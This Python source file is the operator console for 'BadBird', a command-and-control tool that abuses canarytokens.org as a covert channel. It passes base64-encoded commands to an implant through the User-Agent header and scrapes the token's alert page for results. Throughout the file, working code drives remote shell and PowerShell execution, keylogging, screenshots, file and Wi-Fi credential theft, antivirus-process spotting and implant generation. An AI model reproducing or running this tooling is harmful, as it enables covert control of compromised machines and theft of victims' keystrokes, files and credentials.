# BadBird C2 Through Canarytokens
# Author: Austin Martin @amartinsec/blog.amartinsec.com

# Imports
import base64
import os
import platform
import re

import requests
from bs4 import BeautifulSoup
# Clear screen on start for colorama to work in Windows shell
from colorama import init
from fake_useragent import UserAgent


init(convert=True)
os.system('cls' if os.name == 'nt' else 'clear')

from resources.modules.helpmenu import *
from resources.modules.postExp import *
from resources.modules.genimplant import *
from resources.modules.processhighlight import *

# Globals
ua = UserAgent()
token = ""
url = ""
authtoken = ""
canaryManagementURL = ""
canaryJsonURL = ""
cmdcount = 0
email = "blah@foobar.com"
comment = "BadBird C2"
pwd = False
dir = ""
oldtoken = ""
connected = False
done = False
doneWaitForImplant = False
chunkedlen = 0
screenshotdone = False
ps = False
waitForKeys = False
lootpath = ""
requestedfile = ""


def generate_canarytoken():
    # Check if template loot dir exists. If not, create it
    #lootdir = os.path.dirname(lootpath)
    #if not os.path.exists(lootdir):
    #    os.makedirs(lootdir)

    stripedUA = ua.random

    headers = {"User-Agent": stripedUA.strip(), "Accept": "application/json, text/javascript, */*; q=0.01",
               "Accept-Language": "en-US,en;q=0.5",
               "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest",
               "Content-Type": "multipart/form-data; boundary=---------------------------190937841334444176471993165026",
               "Origin": "https://www.canarytokens.org", "Referer": "https://www.canarytokens.org/generate",
               "Sec-Fetch-Dest": "empty",
               "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}

    genURL = "https://www.canarytokens.org:443/generate"

    generateReq = "-----------------------------190937841334444176471993165026\r\nContent-Disposition: form-data; name=\"type\"\r\n\r\nweb\r" \
                  "\n-----------------------------190937841334444176471993165026\r\nContent-Disposition: form-data; " \
                  "name=\"email\"\r\n\r\n" + email + "\r\n-----------------------------190937841334444176471993165026\r\n" \
                                                     "Content-Disposition: form-data; name=\"webhook\"\r\n\r\n\r\n-----------------------------190937841334444176471993165026\r\n" \
                                                     "Content-Disposition: form-data; name=\"fmt\"\r\n\r\n\r\n-----------------------------190937841334444176471993165026\r\n" \
                                                     "Content-Disposition: form-data; name=\"memo\"\r\n\r\n" + comment + "\r\n-----------------------------190937841334444176471993165026\r\n" \
                                                                                                                         "Content-Disposition: form-data; name=\"cmd_process\"\r\n\r\n\r\n-----------------------------190937841334444176471993165026\r\n" \
                                                                                                                         "Content-Disposition: form-data; name=\"clonedsite\"\r\n\r\n\r\n-----------------------------190937841334444176471993165026\r\n" \
                                                                                                                         "Content-Disposition: form-data; name=\"sql_server_table_name\"\r\n\r\nTABLE1\r\n-----------------------------190937841334444176471993165026\r\n" \
                                                                                                                         "Content-Disposition: form-data; name=\"sql_server_view_name\"\r\n\r\nVIEW1\r\n-----------------------------190937841334444176471993165026\r\n" \
                                                                                                                         "Content-Disposition: form-data; name=\"sql_server_function_name\"\r\n\r\nFUNCTION1\r\n-----------------------------190937841334444176471993165026\r\n" \
                                                                                                                         "Content-Disposition: form-data; name=\"sql_server_trigger_name\"\r\n\r\nTRIGGER1\r\n-----------------------------190937841334444176471993165026\r\n" \
                                                                                                                         "Content-Disposition: form-data; name=\"redirect_url\"\r\n\r\n\r\n-----------------------------190937841334444176471993165026--\r\n"

    response = requests.post(genURL, headers=headers, data=generateReq)

    if "200" not in str(response):
        print(Fore.RED + "[-]" + Fore.RESET + " Error generating token\n")
        print(Fore.RED + "[-]" + Fore.RESET + " Exiting...")
        sys.exit(1)

    else:
        print(Fore.BLUE + "[!]" + Fore.RESET + " Token generated successfully")
        global token
        token = response.json().get("Token")
        global url
        url = response.json().get("Url")
        global authtoken
        authtoken = response.json().get("Auth")
        global canaryManagementURL
        canaryManagementURL = "https://www.canarytokens.org/history/?token=" + token + "&auth=" + authtoken
        print(Fore.BLUE + "[!]" + Fore.RESET + " Alert Token: " + token)
        print(Fore.BLUE + "[!]" + Fore.RESET + " URL: " + url)
        print(Fore.BLUE + "[!]" + Fore.RESET + " Auth Token: " + authtoken)
        print(Fore.BLUE + "[!]" + Fore.RESET + " Canary Management URL: " + canaryManagementURL)


# Task implant with running command
def taskCommand(cmd):
    if pwd == True:
        cmd = "pwdtask:" + cmd

    if cmd.startswith("fallback:") or cmd.startswith("keystrokes:") or cmd.startswith("screenshot:") or cmd.startswith("download:") or cmd.startswith("wificreds:"):
        cmd = cmd

    else:
        cmd = "task:" + cmd

    cmd = base64.b64encode(cmd.encode("utf-8"))
    headers = {
        "User-Agent": cmd,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
        "Upgrade-Insecure-Requests": "1"}

    global oldtoken

    if oldtoken != "":
        response = requests.get(oldtoken, headers=headers)

    else:
        response = requests.get(url, headers=headers)


# Animate for chunking
def chunkAnimate():
    for c in itertools.cycle(['[|] Rebuilding Output', '[/] Rebuilding Output.', '[-] Rebuilding Output..',
                              '[\\] Rebuilding Output...']):
        if doneChunked:
            break
        sys.stdout.write('\r' + Fore.BLUE + c + Fore.RESET)
        sys.stdout.flush()
        time.sleep(0.25)


# Request to get results from command
def getResults(lastdictsize):
    stripedUA = ua.random
    global doneChunked
    doneChunked = False
    global screenshotdone
    screenshotdone = False
    global lootpath
    global requestedfile
    global ps

    headers = {
        "User-Agent": stripedUA.strip(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
        "Upgrade-Insecure-Requests": "1"}

    stringbuilder = ""
    chunkedlen = 0

    while True:
        reslist = []
        decodedlist = []
        response = requests.get(canaryManagementURL, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        data = soup.find_all("td")

        for tr in data:
            if ("useragent" in tr.text):
                reslist.append(data[data.index(tr) + 1].text.strip())

        showChunkWarning = True

        if len(reslist) > 45:
            print(Fore.BLUE + "\n[!]" + Fore.RESET + " Too many alerts for this token!")
            print(Fore.BLUE + "[!]" + Fore.RESET + " Rerun last command after reconnection...")
            time.sleep(5)
            fallback()
            return (1)

        try:
            for count in reslist:
                cmd = base64.b64decode(count).decode('utf-8')

                # Response was too long to send in >50 chunks, generate new token
                if (cmd == "toolong:"):
                    print(
                        Fore.BLUE + "\n[!]" + Fore.RESET + " Response too large to reconstruct. Command can not be ran")
                    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token to be safe")
                    fallback()
                    return (1)

                # nightmare fuel
                elif cmd.startswith("chunked:"):
                    command = cmd.replace("chunked:", "")
                    chunkedlen = int(command)

                    # let user know we are breaking up the result
                    if showChunkWarning:
                        print(
                            Fore.BLUE + "\n[!]" + Fore.RESET + " Response too large to send in one request. We'll have to split it up into chunks")
                        print(
                            Fore.BLUE + "[!]" + Fore.RESET + " Attempting to reassemble from " + command + " chunked requests...\n")
                        showChunkWarning = False
                        tChunk = threading.Thread(target=chunkAnimate)
                        tChunk.daemon = True
                        tChunk.start()

                    while True:
                        # now we start the logic loop of grabbing ALL chunks and reassembling them
                        chunkedlist = []
                        trash = []
                        response = requests.get(canaryManagementURL, headers=headers)
                        soupChunk = BeautifulSoup(response.text, 'html.parser')
                        trash = soupChunk.find_all("td")

                        for x in trash:
                            if ("useragent" in x.text):
                                chunkedlist.append(x.find_next_sibling().string.strip())

                        # Loop until we have ALL the chunked data
                        if (len(chunkedlist)) == (len(reslist) + chunkedlen):
                            stringbuilder = ""
                            holder = chunkedlist[:chunkedlen]
                            break

                        else:
                            chunkedlist.clear()
                            trash.clear()

                    # need to reverse the list
                    holder.reverse()
                    for q in holder:
                        stringbuilder += base64.b64decode(q).decode('utf-8')

                    # print("Stringbuilder value:\n" + stringbuilder)
                    # stringbuilder= stringbuilder.replace("res:", "")
                    decodedlist.append(stringbuilder)
                    # Need to sleep for large requests
                    time.sleep(1)
                    doneChunked = True
                    stringbuilder = stringbuilder.replace("res:", "")

                    if ps == True:
                        ps = False
                        highlightprocesses(decodedlist[-1])
                        fallback()
                        return (1)

                    print(Fore.GREEN + "[+]" + Fore.RESET + " Result: \n" + stringbuilder)
                    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token after chunked request...")
                    fallback()
                    return (1)

                elif cmd.startswith("pic:"):
                    command = cmd.replace("pic:", "")
                    chunkedlen = int(command)

                    # let user know we are breaking up the result
                    if showChunkWarning:
                        print(Fore.BLUE + "\n[!]" + Fore.RESET + " Screenshot returning in multiple chunks")
                        print(
                            Fore.BLUE + "[!]" + Fore.RESET + " Attempting to reassemble screenshot from " + command + " chunked requests...\n")
                        showChunkWarning = False
                        tChunk = threading.Thread(target=chunkAnimate)
                        tChunk.daemon = True
                        tChunk.start()

                    while True:
                        # now we start the logic loop of grabbing ALL chunks and reassembling them
                        chunkedlist = []
                        trash = []
                        response = requests.get(canaryManagementURL, headers=headers)
                        soupChunk = BeautifulSoup(response.text, 'html.parser')
                        trash = soupChunk.find_all("td")

                        for x in trash:
                            if ("useragent" in x.text):
                                chunkedlist.append(x.find_next_sibling().string.strip())

                        # Loop until we have ALL the chunked data
                        if (len(chunkedlist)) == (len(reslist) + chunkedlen):
                            stringbuilder = ""
                            holder = chunkedlist[:chunkedlen]
                            break

                        else:
                            chunkedlist.clear()
                            trash.clear()

                    # need to reverse the list
                    holder.reverse()
                    for q in holder:
                        stringbuilder += q

                    decodedlist.append(stringbuilder)
                    # Need to sleep for large requests
                    time.sleep(1)
                    doneChunked = True
                    imgbytes = base64.b64decode(decodedlist[-1])
                    timestr = time.strftime("%Y%m%d-%H%M%S")

                    with open(lootpath + timestr + ".jpg", "wb") as f:
                        f.write(imgbytes)
                        f.close()
                    print(Fore.GREEN + "\n\n[+]" + Fore.RESET + " Screenshot saved to " + lootpath + timestr + ".jpg")

                    #To open screenshot after capturing it
                    try:
                        os.system("start " + lootpath + timestr + ".jpg")
                    except:
                        pass

                    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Grabbing new token after screenshot...")
                    fallback()
                    return (1)

                elif cmd.startswith("incomingfile:"):
                    command = cmd.replace("incomingfile:", "")
                    chunkedlen = int(command)

                    # let user know we are breaking up the result
                    if showChunkWarning:
                        print(Fore.BLUE + "\n[!]" + Fore.RESET + " File returning in multiple chunks")
                        print(
                            Fore.BLUE + "[!]" + Fore.RESET + " Attempting to reassemble file from " + command + " chunked requests...\n")
                        showChunkWarning = False
                        tChunk = threading.Thread(target=chunkAnimate)
                        tChunk.daemon = True
                        tChunk.start()

                    while True:
                        # now we start the logic loop of grabbing ALL chunks and reassembling them
                        chunkedlist = []
                        trash = []
                        response = requests.get(canaryManagementURL, headers=headers)
                        soupChunk = BeautifulSoup(response.text, 'html.parser')
                        trash = soupChunk.find_all("td")

                        for x in trash:
                            if ("useragent" in x.text):
                                chunkedlist.append(x.find_next_sibling().string.strip())

                        # Loop until we have ALL the chunked data
                        if (len(chunkedlist)) == (len(reslist) + chunkedlen):
                            stringbuilder = ""
                            holder = chunkedlist[:chunkedlen]
                            break

                        else:
                            chunkedlist.clear()
                            trash.clear()

                    # need to reverse the list
                    holder.reverse()
                    for q in holder:
                        stringbuilder += q

                    decodedlist.append(stringbuilder)
                    # Need to sleep for large requests
                    time.sleep(1)
                    doneChunked = True
                    filebytes = base64.b64decode(decodedlist[-1])
                    timestr = time.strftime("%Y%m%d-%H%M%S")

                    with open(lootpath + timestr + requestedfile, "wb") as f:
                        f.write(filebytes)
                        f.close()
                    print(Fore.GREEN + "\n\n[+]" + Fore.RESET + " File saved to " + lootpath + timestr + "_" + requestedfile)

                    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Grabbing new token after file grab...")
                    fallback()
                    return (1)

                elif cmd.startswith("res:"):
                    command = cmd.replace("res:", "")
                    decodedlist.append(command)

                elif cmd.startswith("keys:"):
                    decodedlist.append(cmd)

                elif cmd.startswith("pwd:"):
                    command = cmd.replace("pwd:", "")
                    global dir
                    dir = command.split(":res:")[0]
                    result = command.split(":res:")[1]
                    result = result.replace(":res:", "")
                    decodedlist.append(result)

            # Ensure we are grabbing the latest results
            if len(reslist) > lastdictsize:
                # if error running command
                if (decodedlist[-1] == "Error with last ran command"):
                    print(Fore.RED + "[-] " + Fore.RESET + " Result: \n" + decodedlist[-1] + "\n")
                    #                    if logging == True:
                    #                        log("[-] Result: \n" + decodedlist[-1] + "\n")
                    break


                # if keylogging results
                elif (decodedlist[-1].startswith("keys:")):
                    decodedlist[-1] = decodedlist[-1].replace("keys:", "")
                    print(Fore.GREEN + "\n\n[+]" + Fore.RESET + " Keystroke since last fetch: \n" + decodedlist[
                        -1] + "\n")
                    try:
                        with open(lootpath + "Keystroke_Log.txt", "a+") as f:
                            f.write(decodedlist[-1])
                            f.close()
                        print(
                            Fore.BLUE + "\n[!]" + Fore.RESET + " Saved/Updated keystrokes to: " + lootpath + "Keystroke_Log.txt\n")

                    except Exception as e:
                        print(Fore.RED + "[-]" + Fore.RESET + " Error saving keystrokes: " + str(e))
                        pass
                    break

                else:
                    if (pwd == True):
                        print(decodedlist[-1])
                        break

                    else:
                        print(Fore.GREEN + "[+]" + Fore.RESET + " Result: \n" + decodedlist[-1])
                        break


        except Exception as e:
            #print(Fore.RED + "[-]" + Fore.RESET + " Error: " + str(e))
            #exc_type, exc_obj, exc_tb = sys.exc_info()
            #fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            #print(exc_type, fname, exc_tb.tb_lineno)
            pass

    return (len(reslist) + 1)


def animateWaitForImplant():
    for c in itertools.cycle(['[|] Waiting for implant connection', '[/] Waiting for implant connection.',
                              '[-] Waiting for implant connection..', '[\\] Waiting for implant connection...']):
        if doneWaitForImplant:
            break
        sys.stdout.write('\r' + Fore.BLUE + c + Fore.RESET)
        sys.stdout.flush()
        time.sleep(0.25)


def wait_for_implant():
    global doneWaitForImplant
    doneWaitForImplant = False

    # cool animation time
    t = threading.Thread(target=animateWaitForImplant)
    t.daemon = True
    t.start()

    loop = True
    while loop == True:
        time.sleep(1)
        stripedUA = ua.random.strip()
        headers = {
            "User-Agent": stripedUA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
            "Upgrade-Insecure-Requests": "1"}

        response = requests.get(canaryManagementURL, headers=headers)

        if (response.status_code != 200):
            print(Fore.RED + "[-]" + Fore.RESET + "Error connecting... Exiting")
            sys.exit(1)

        else:
            try:
                useragents = []
                soup = BeautifulSoup(response.text, 'html.parser')
                data = soup.find_all("td")

                for tr in data:
                    if ("useragent" in tr.text):
                        useragents.append(data[data.index(tr) + 1].text.strip())

                for count in useragents:
                    cmd = base64.b64decode(count).decode('utf-8')
                    if cmd == "hello":
                        global connected
                        connected = True
                        loop = False

            except Exception as e:
                print(e)
                pass

    doneWaitForImplant = True
    print(Fore.BLUE + "\n\n[!]" + Fore.RESET + " Implant connected!\n")


def implantSleep(time, jitter):
    cmd = "stime:" + str(time) + ":" + str(jitter)
    cmd = base64.b64encode(cmd.encode("utf-8"))
    headers = {
        "User-Agent": cmd,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
        "Upgrade-Insecure-Requests": "1"}
    response = requests.get(url, headers=headers)


def animateFetchKeylog():
    for c in itertools.cycle(['[|] Requesting Keystrokes', '[/] Requesting Keystrokes.', '[-] Requesting Keystrokes..',
                              '[\\] Requesting Keystrokes...']):
        if waitForKeys:
            print("\n\n")
            break
        sys.stdout.write('\r' + Fore.BLUE + c + Fore.RESET)
        sys.stdout.flush()
        time.sleep(0.25)


def keystrokes(keychoice):
    global lastdictsize
    global waitForKeys
    waitForKeys = False

    if keychoice == "start":
        cmd = base64.b64encode("keystart:".encode("utf-8"))
        print(Fore.BLUE + "[!]" + Fore.RESET + " Implant now logging keystrokes\n")


    elif keychoice == "stop":
        cmd = base64.b64encode("keystop:".encode("utf-8"))
        print(Fore.BLUE + "[!]" + Fore.RESET + " Implant stopped logging keystrokes\n")


    elif keychoice == "fetch":
        cmd = base64.b64encode("keyfetch:".encode("utf-8"))
        tkeystrokes = threading.Thread(target=animateFetchKeylog)
        tkeystrokes.daemon = True
        tkeystrokes.start()


    else:
        print(Fore.RED + "[-]" + Fore.RESET + " Error. Returning to main\n")
        return

    headers = {
        "User-Agent": cmd,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
        "Upgrade-Insecure-Requests": "1"}

    response = requests.get(url, headers=headers)
    if keychoice == "fetch":
        lastdictsize = getResults(lastdictsize)
        waitForKeys = True


def fallback():
    try:
        print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating fallback token...")
        global pwd
        pwd = False
        global oldtoken
        oldtoken = url
        generate_canarytoken()
        print(Fore.BLUE + "[!]" + Fore.RESET + " Sending implant the new token...")
        taskCommand("fallback:" + canaryManagementURL)
        oldtoken = ""
        global lastdictsize
        lastdictsize = 1
        wait_for_implant()
        return

    except Exception as e:
        print(Fore.RED + "[-]" + Fore.RESET + " Error: " + str(e))
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        print(exc_type, fname, exc_tb.tb_lineno)
        pass



def killimplant(clean):
    if clean == False:
        while True:
            choice = input(
                Fore.BLUE + "[!]" + Fore.RESET + " Do you want the implant to remove itself from the system? (y/n): ").lower()
            if choice == "y" or choice == "yes":
                print(Fore.BLUE + "[!]" + Fore.RESET + " Killing and removing implant from system...\n")
                clean = True
                break

            elif choice == "n" or choice == "no":
                print(Fore.BLUE + "\n[!]" + Fore.RESET + " Implant will stay on the system...\n")
                clean = False
                break

            else:
                print(Fore.RED + "[-]" + Fore.RESET + " Invalid choice. Options are `y/n` or `yes/no`")
                continue

    else:
        print(Fore.BLUE + "[!]" + Fore.RESET + " Killing and removing implant from system...\n")

    if clean == True:
        cmd = ("solongclean:")

    else:
        cmd = ("solongdirty:")

    cmd = base64.b64encode(cmd.encode("utf-8"))
    headers = {
        "User-Agent": cmd,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
        "Upgrade-Insecure-Requests": "1"}
    response = requests.get(url, headers=headers)
    print(Fore.BLUE + "[!]" + Fore.RESET + " Implant Killed!\n")


def animate():
    for c in itertools.cycle(['[|] loading', '[/] loading.', '[-] loading..', '[\\] loading...']):
        if done:
            break
        sys.stdout.write('\r' + Fore.BLUE + c + Fore.RESET)
        sys.stdout.flush()
        time.sleep(0.25)


def main():
    welcome()
    # Need to investigate further, but running on Linux was extremely unstable
    currentOS = platform.system()
    if (currentOS != "Windows"):
        print(
            Fore.RED + "\n[-]" + Fore.RESET + " You can only generate an exe payload on a Windows system with pyinstaller. Current OS: " + currentOS + "\n")
        return

    global lastdictsize
    lastdictsize = 1
    global pwd
    global connected
    global url
    global lootpath
    global requestedfile
    lootpath ="loot/template/"
    global canaryManagementURL
    try:
        while True:
            if (pwd == False):
                cmd = input(Fore.GREEN + "BadBird>> " + Fore.RESET)
            else:
                try:
                    cmd = input("\n" + Fore.GREEN + dir.strip() + "> " + Fore.RESET)
                except:
                    cmd = input(Fore.GREEN + "BadBird>> " + Fore.RESET)



            if cmd.lower() == "exit":
                if connected == True:
                    print(Fore.RED + "[-]" + Fore.RESET + " You currently have an implant connected.")
                    print(
                        Fore.RED + "[-]" + Fore.RESET + " Would you like to kill the implant before disconnecting? (`y`/`n`)")
                    choice = input(Fore.RED + "[-]" + Fore.RESET + " Choice: ").lower()
                    if choice == "y" or choice == "yes":
                        killimplant(False)

                    if choice == "n" or choice == "no":
                        pass

                    else:
                        print(Fore.RED + "[-]" + Fore.RESET + " Invalid choice. Options are `y/n` or `yes/no`")
                        continue

                print(Fore.BLUE + "[!]" + Fore.RESET + " Exiting...")
                sys.exit(1)

            elif cmd.lower() == "help":
                help()


            elif cmd.lower().startswith("connect "):
                try:
                    cmd = cmd.replace("connect ", "")
                    canaryManagementURL = cmd
                    start = "token="
                    end = "&auth="
                    url = ("http://canarytokens.com/about/" + canaryManagementURL[
                                                              canaryManagementURL.index(start) + len(start):
                                                              canaryManagementURL.index(end)] + "/contact.php")


                except Exception as e:
                    print(e)
                    print(Fore.RED + "[-]" + Fore.RESET + " Error, with your input. Please try again.")
                    continue


            elif cmd.lower().startswith("sleep"):
                if connected == True:
                    try:
                        sleeptime = cmd.split("sleep ")[1]
                        try:
                            jitterpercent = sleeptime.split(" ")[1]
                        except:
                            jitterpercent = 0
                        sleeptime = sleeptime.split(" ")[0]
                        if int(jitterpercent) > 100 or int(jitterpercent) < 0:
                            print(Fore.RED + "[-]" + Fore.RESET + " Jitter percentage has to be between 0-100.")
                            continue
                        if int(sleeptime) <= 0:
                            print(Fore.RED + "[-]" + Fore.RESET + " Sleep time must be greater than 0.")
                            continue
                        implantSleep(int(sleeptime), int(jitterpercent))
                        if jitterpercent != 0:
                            print(Fore.BLUE + "[!]" + Fore.RESET + " Implant will now sleep for " + str(
                            sleeptime) + " seconds with a " + jitterpercent + "% jitter before checking in with the canarytokens.org server\n")
                        else:
                            print(Fore.BLUE + "[!]" + Fore.RESET + " Implant will now sleep for " + str(
                                sleeptime) + " seconds before checking in with the canarytokens.org server\n")


                    except Exception as e:
                        print(e)
                        print(
                            Fore.RED + "[-]" + Fore.RESET + " Error with sleep command. Format is: sleep <time in seconds> <jitter percent amount>\n")
                else:
                    print(
                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")


            elif cmd.lower().startswith("email "):
                try:
                    global email
                    # regex for a valid email
                    regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
                    enteredemail = cmd.split("email ")[1]
                    if (re.fullmatch(regex, enteredemail)):
                        email = enteredemail
                        print(Fore.BLUE + "[!]" + Fore.RESET + " Will now use `" + email + "` for creating tokens\n")
                    else:
                        print(Fore.RED + "[-]" + Fore.RESET + " Invalid email address\n")

                except Exception as e:
                    print(Fore.RED + "[-]" + Fore.RESET + " Error with setting new email\n")


            elif cmd.lower() == "pwd":
                if connected == True:
                    print(Fore.BLUE + "[!]" + Fore.RESET + " Now adding current path to output")
                    if pwd == False:
                        print(Fore.BLUE + "[!]" + Fore.RESET + " Now adding current path to output")
                        pwd = True
                    else:
                        print(Fore.BLUE + "[!]" + Fore.RESET + " Removing current path from output")
                        pwd = False
                else:
                    print(
                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")

            elif cmd.lower() == "fallback":
                if connected == True:
                    fallback()
                else:
                    print(
                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")

            elif cmd.lower() == "kill":
                if connected == True:
                    killimplant(False)
                    connected = False
                else:
                    print(
                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")


            elif cmd.lower() == "kill clean":
                if connected == True:
                    killimplant(True)
                    connected = False
                else:
                    print(
                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")


            elif cmd.lower() == "post-exp":
                if connected == True:
                    print(Fore.BLUE + "[!]" + Fore.RESET + " Entering BadBird post-exploitation shell...\n")
                    cmd = postExpShell()
                    if cmd != "":
                        taskCommand(cmd)
                        lastdictsize = getResults(lastdictsize)

                else:
                    print(
                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")

            elif cmd.lower() == "screenshot":
                if connected == True:
                    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token for screenshot")
                    fallback()
                    time.sleep(1)
                    print(Fore.BLUE + "[!]" + Fore.RESET + " Sending screenshot command...")
                    taskCommand("saycheese:")
                    lastdictsize = getResults(lastdictsize)
                else:
                    print(
                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")

            elif cmd.startswith("download "):
                if connected == True:
                    requestedfile = cmd.split("download ")[1]
                    fallback()
                    time.sleep(1)
                    taskCommand("download:" + requestedfile)
                    lastdictsize = getResults(lastdictsize)
                else:
                    print(
                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")


            elif cmd.lower() == "create-implant":
                if (connected == True):
                    print(
                        Fore.RED + "\n[-]" + Fore.RESET + " Warning: You already have a connected implant. If you create a new one, you will lose the old one.")
                    choice = input(Fore.RED + "[-]" + Fore.RESET + " Do you want to continue? (y/n): ").lower()
                    if choice == "y" or choice == "yes":
                        if canaryManagementURL == "":
                            print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token...")
                            generate_canarytoken()
                        lootpath = generateimplant(canaryManagementURL)
                        wait_for_implant()
                        continue
                    elif choice == "n" or choice == "no":
                        continue
                    else:
                        print(Fore.RED + "[-]" + Fore.RESET + " Invalid choice. Options are `y/n` or `yes/no`")
                        continue
                else:
                    if canaryManagementURL == "":
                        print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token...")
                        generate_canarytoken()
                    lootpath = generateimplant(canaryManagementURL)
                    wait_for_implant()

            elif cmd.lower() == "create-token":
                if (canaryManagementURL != ""):
                    print(
                        Fore.RED + "\n[-]" + Fore.RESET + " Warning: You already have a token. If you create a new one, you will lose the old one.")
                    choice = input(Fore.RED + "[-]" + Fore.RESET + " Do you want to continue? (y/n): ").lower()
                    if choice == "y" or choice == "yes":
                        connected = False
                        print(Fore.BLUE + "[!]" + Fore.RESET + " Generating Canarytoken...")
                        lastdictsize = 1
                        generate_canarytoken()
                        wait_for_implant()
                        continue

                    elif choice == "n" or choice == "no":
                        continue

                    else:
                        print(Fore.RED + "[-]" + Fore.RESET + " Invalid choice. Options are `y/n` or `yes/no`")
                        continue
                else:
                    print(Fore.BLUE + "[!]" + Fore.RESET + " Generating Canarytoken...")
                    generate_canarytoken()
                    wait_for_implant()

            elif cmd.lower() == "canary-info":
                if connected == True:
                    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Token: " + token)
                    print(Fore.BLUE + "[!]" + Fore.RESET + " Alert URL: " + url)
                    print(Fore.BLUE + "[!]" + Fore.RESET + " Auth Token: " + authtoken)
                    print(Fore.BLUE + "[!]" + Fore.RESET + " Canary Management URL: " + canaryManagementURL + "\n")

                else:
                    print(
                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")

            elif cmd.lower() == "ps":
                if connected == True:
                    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Attempting to grab a list of running processes...\n")
                    print(
                        Fore.BLUE + "[!]" + Fore.RESET + " Suspected AV processes will be highlighted in " + Fore.RED + "RED" + Fore.RESET)
                    print(
                        Fore.BLUE + "[!]" + Fore.RESET + " Explorer and Winlogon processes will be highlighted in " + Fore.BLUE + "BLUE" + Fore.RESET)
                    print(
                        Fore.BLUE + "[!]" + Fore.RESET + " Browser processes will be highlighted in " + Fore.GREEN + "GREEN" + Fore.RESET)
                    print(
                        Fore.BLUE + "[!]" + Fore.RESET + " Admin tool processes will be highlighted in " + Fore.YELLOW + "YELLOW\n" + Fore.RESET)
                    taskCommand("tasklist /V")
                    global ps
                    ps = True
                    lastdictsize = getResults(lastdictsize)
                    ps = False

                else:
                    print(
                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")


            elif cmd.lower().startswith("keystrokes"):
                if connected == True:
                    keychoice = cmd.replace("keystrokes ", "")
                    if keychoice.lower() != "start" and keychoice.lower() != "stop" and keychoice.lower() != "fetch":
                        print(
                            Fore.RED + "[-]" + Fore.RESET + " Invalid option. Valid entry is: keystrokes `start` `stop` or `fetch`\n")
                        continue
                    else:
                        keystrokes(keychoice)
                else:
                    print(
                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
                    continue


            elif cmd.lower().startswith("powershell "):
                if connected == True:
                    taskCommand("powershell.exe -c " + cmd.split("powershell ")[1])
                    lastdictsize = getResults(lastdictsize)

                else:
                    print(
                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")


            elif cmd.lower().startswith("shell "):
                if connected == True:
                    cmd = cmd.replace("shell ", "", 1)
                    taskCommand(cmd)
                    lastdictsize = getResults(lastdictsize)
                else:
                    print(
                        Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")

            elif cmd=="":
                continue

            # If none of the above is true
            else:
                print(Fore.RED + "[-]" + Fore.RESET + " Invalid command. Type `help` for a list of commands\n")

    except Exception as e:
        print(Fore.RED + "[-]" + Fore.RESET + " Error: " + str(e))
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        print(exc_type, fname, exc_tb.tb_lineno)
        pass


if __name__ == '__main__':
    main()
